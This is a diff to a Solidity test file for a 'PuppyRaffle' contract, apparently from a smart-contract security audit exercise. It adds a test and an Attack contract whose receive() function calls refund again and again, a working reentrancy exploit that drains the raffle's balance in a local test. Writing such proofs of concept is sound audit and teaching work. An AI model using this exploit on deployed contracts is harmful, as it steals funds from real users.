@@ -120,6 +120,32 @@ contract PuppyRaffleTest is Test {
         assertEq(address(playerOne).balance, balanceBefore + entranceFee);
     }
 
+    function testCanReenter() public playerEntered {
+        address[] memory players = new address[](4);
+        players[0] = address(10);
+        players[1] = address(11);
+        players[2] = address(12);
+        players[3] = address(13);
+
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        Attack attackerContract = new Attack(puppyRaffle);
+        address attackerUser = makeAddr("attackerUser");
+        vm.deal(attackerUser, 1 ether);
+
+        uint256 startAttackerContractBalance = address(attackerContract).balance;
+        uint256 startPuppyRaffleContractBalance = address(puppyRaffle).balance;
+
+        vm.prank(attackerUser);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("Attacker Balance start: ", startAttackerContractBalance);
+        console.log("PuppyRaffle Balance start: ", startPuppyRaffleContractBalance);
+        
+        console.log("Attacker Contract balance after attack: ", address(attackerContract).balance);
+        console.log("PuppyRaffle Contract balance after attack: ", address(puppyRaffle).balance);
+    }
+
     function testGettingRefundRemovesThemFromArray() public playerEntered {
         uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
 
@@ -237,5 +263,31 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+}
+
+
+contract Attack {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle){
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    } 
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    receive() external payable {
+        if(address(puppyRaffle).balance >= entranceFee){
+            puppyRaffle.refund(attackerIndex);
+        }
     }
 }
